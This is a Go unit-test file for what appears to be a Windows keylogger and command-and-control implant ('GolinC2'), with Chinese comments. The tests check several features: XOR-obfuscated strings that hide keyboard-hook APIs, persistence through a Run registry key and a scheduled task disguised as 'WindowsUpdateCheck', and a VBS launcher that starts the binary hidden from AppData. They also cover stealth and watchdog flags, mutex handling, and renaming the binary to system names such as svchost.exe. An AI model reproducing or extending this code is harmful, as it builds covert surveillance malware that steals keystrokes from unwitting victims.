//go:build windows

package cmd

import (
	"path/filepath"
	"runtime"
	"syscall"
	"testing"
	"unsafe"
)

func TestFilterArgs(t *testing.T) {
	in := []string{"keylogger", "--every", "3", "--stealth", "--install", "--watchdog", "--uninstall"}
	out := filterArgs(in)
	want := []string{"keylogger", "--every", "3", "--stealth"}
	if len(out) != len(want) {
		t.Fatalf("len = %d, want %d: %v", len(out), len(want), out)
	}
	for i := range want {
		if out[i] != want[i] {
			t.Fatalf("out[%d] = %q, want %q", i, out[i], want[i])
		}
	}
}

func TestXorDecode(t *testing.T) {
	encode := func(s string) string {
		b := []byte(s)
		for i := range b {
			b[i] ^= obfKey[i%len(obfKey)]
		}
		return string(b)
	}
	for _, s := range []string{"user32.dll", "SetWindowsHookExW", "GolinC2MainMutex"} {
		if got := x(encode(s)); got != s {
			t.Fatalf("x() = %q, want %q", got, s)
		}
	}
}

func TestLnkName(t *testing.T) {
	// 防止混淆常量与明文漂移
	if lnkFileName != "WindowsUpdateCheck.lnk" {
		t.Fatalf("lnkFileName = %q, want WindowsUpdateCheck.lnk", lnkFileName)
	}
	if schedTaskName != "WindowsUpdateCheck" {
		t.Fatalf("schedTaskName = %q, want WindowsUpdateCheck", schedTaskName)
	}
	if vbsFileName != "WindowsUpdateCheck.vbs" {
		t.Fatalf("vbsFileName = %q, want WindowsUpdateCheck.vbs", vbsFileName)
	}
}

// TestLauncherVbs 校验静默启动脚本内容:VBS 引号转义正确、
// 窗口样式为 0(SW_HIDE)、不等待返回
func TestLauncherVbs(t *testing.T) {
	target := `C:\Users\test\AppData\Roaming\Windows\winsvc.exe`
	launch := "--stealth --stealth-mem 2 --every 5 --watchdog"
	got := launcherVbs(target, launch)
	want := "Set s = CreateObject(\"WScript.Shell\")\r\n" +
		"s.Run \"\"\"C:\\Users\\test\\AppData\\Roaming\\Windows\\winsvc.exe\"\" " +
		"--stealth --stealth-mem 2 --every 5 --watchdog\", 0, False\r\n"
	if got != want {
		t.Fatalf("launcherVbs() = %q\nwant %q", got, want)
	}
}

// TestRunKeyNames 校验注册表混淆常量解码后的明文
func TestRunKeyNames(t *testing.T) {
	if runKeyPath != `Software\Microsoft\Windows\CurrentVersion\Run` {
		t.Fatalf("runKeyPath = %q", runKeyPath)
	}
	if runValueName != "WindowsUpdateCheck" {
		t.Fatalf("runValueName = %q", runValueName)
	}
}

func TestMutexTakeAndExists(t *testing.T) {
	if !takeMutex(mutexNameMain) {
		t.Fatal("first take should succeed")
	}
	if !mutexExists(mutexNameMain) {
		t.Fatal("mutex should exist after take")
	}
	if mutexExists(mutexNameWatch) {
		t.Fatal("watchdog mutex should not exist")
	}
}

// TestTakeMutexContended 互斥体被其他线程持有时不得接管(模拟跨进程竞争;
// 同线程重复获取因 Windows 互斥体可递归而成功,属无害行为)
func TestTakeMutexContended(t *testing.T) {
	const name = "GolinC2TestContended"
	held := make(chan struct{})
	release := make(chan struct{})
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		if !takeMutex(name) {
			t.Error("holder take failed")
			close(held)
			return
		}
		close(held)
		<-release // 保持线程持有互斥体直到测试结束
	}()
	<-held
	if takeMutex(name) {
		t.Fatal("take should fail while held by another thread")
	}
	close(release)
}

// TestTakeMutexReclaimsAbandoned 模拟"对象存活但无人持有"的僵尸互斥体:
// 持有者进程被杀后,若对象被外部句柄保活,新实例必须能即时接管
func TestTakeMutexReclaimsAbandoned(t *testing.T) {
	const name = "GolinC2TestReclaim"
	// 先创建一个无主互斥体并保持句柄打开,模拟对象被外部句柄保活
	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		t.Fatal(err)
	}
	h, _, _ := callProc(pMutexCreate, 0, 0, uintptr(unsafe.Pointer(n)))
	if h == 0 {
		t.Fatal("create seed mutex failed")
	}
	defer callProcDiscard(pCloseHandle, h)

	if !takeMutex(name) {
		t.Fatal("takeMutex should reclaim unowned mutex")
	}
	if !mutexExists(name) {
		t.Fatal("mutex should exist after reclaim")
	}
}

func TestNormalizeExeName(t *testing.T) {
	cases := map[string]string{
		"svchost":      "svchost.exe",
		"winsvc.exe":   "winsvc.exe",
		"WINLOGON.EXE": "WINLOGON.EXE",
		"  ":           "winsvc.exe",
	}
	for in, want := range cases {
		if got := normalizeExeName(in); got != want {
			t.Fatalf("normalizeExeName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestInstalledPath(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("APPDATA", dir)
	old := persistName
	persistName = "custom.exe"
	defer func() { persistName = old }()

	want := filepath.Join(dir, "Windows", "custom.exe")
	if got := installedPath(); got != want {
		t.Fatalf("installedPath() = %q, want %q", got, want)
	}
	if isInstalledCopy() {
		t.Fatal("test binary should not be treated as the installed copy")
	}
}
